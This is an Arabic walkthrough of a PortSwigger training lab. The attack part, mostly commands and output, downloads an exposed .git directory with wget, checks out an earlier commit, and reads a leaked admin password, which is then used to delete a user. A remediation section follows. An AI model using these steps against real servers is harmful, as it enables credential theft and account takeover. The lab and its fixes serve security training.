# [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

## **`الهدف`**
قم بالحصول على كلمة مرور حساب `administrator` وذلك عن طريق الوصول إلى سجل التحكم في الإصدارات ثم قم بحذف حساب `Carlos`.
## **`خطوات الحل`**
سنقوم بالدخول إلى مسار `/.git`
```URL
https://0a5900fa03cf68b28177027c006b0005.web-security-academy.net/.git
```

وسنجد أن الملف ظاهر للعامة، لذلك سنقوم باستخدام الأمر التالي في لينكس لتحميل الملف كامل محليًأ:
```Shell
wget -r https://0a5900fa03cf68b28177027c006b0005.web-security-academy.net/.git
```

بعد ذلك سنقوم بالانتقال للملف الذي تم تحميل بالأمر التالي:
```Shell
cd 0a5900fa03cf68b28177027c006b0005.web-security-academy.net
```

بعد ذلك سنستعمل الأمر التالي لعرض الـ `Commit` السابقة:
```Shell
git log --oneline
```

وسنجد أن النتيجة هي أنه تم حذف كلمة مرور `admin` في الـ `Commit` الحالية
```Shell
9d58235 (HEAD -> master) Remove admin password from config
cbddeb8 Add skeleton admin panel
```

لذلك سنستعمل الأمر التالي للعودة إلى شكل الملف أثناء وجوده في الـ `Commit` السابق
```Shell
git checkout cbddeb8
```

بعد ذلك إذا قمنا بإستعمال الامر التالي
```Shell
ls -la
```

سنجد أن هناك ملف لم يكن موجودًا من قبل قد ظهر باسم `admin.conf`
```Shell
total 60
drwxr-xr-x 3 User User  4096 Oct 18 21:52 .
drwxr-xr-x 5 User User 45056 Oct 18 21:48 ..
-rw-r--r-- 1 User User    36 Oct 18 21:52 admin.conf
drwxr-xr-x 7 User User  4096 Oct 18 21:52 .git
```

وعند استعمال الأمر التالي لفتح الملف كملف نصي:
```Shell
nano admin.conf
```

سنجد بداخله كلمة مرور `admin`
```Shell
ADMIN_PASSWORD=s6vomfaqci0fu9yiyd7e
```

ثم نقوم باستخدام كلمة المرور للدخول إلى حساب `administrator:s6vomfaqci0fu9yiyd7e` ونتوجه إلى `Admin panel` ونقوم بحذف حساب `Carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب تعديل إعدادات السيرفر لمنع الوصول إلى أي ملف أو مجلد يبدأ بنقطة (الملفات المخفية).

ولا يجب أبداً استخدام أوامر مثل `git clone` أو `git pull` مباشرة داخل مجلد الويب، حيث يجب نسخ الملفات النهائية فقط إلى السيرفر مع استثناء مجلد `.git`.

ويجب عدم تخزين كلمات المرور والـ `API Keys` داخل ملف كود ورفعه على `Git` وبدلًا من ذلك يتم تخزينهم في متغيرات بيئة `Environment Variables` مثل ملف `.env` وإضافة هذا الملف إلى `.gitignore` حتى لا يتم رفعه نهائياً إلى مستودع الكود، وفي المشاريع الكبيرة، يُفضل استخدام أدوات إدارة الأسرار مثل `HashiCorp Vault` أو `AWS Secrets Manager`.

وإذا تم رفع كلمة المرور بالخطأ يجب تغيير هذه الكلمة فورًا واستخدام أدوات متخصصة لتنظيف تاريخ `Git` بالكامل من هذه الكلمة أو هذا الملف.
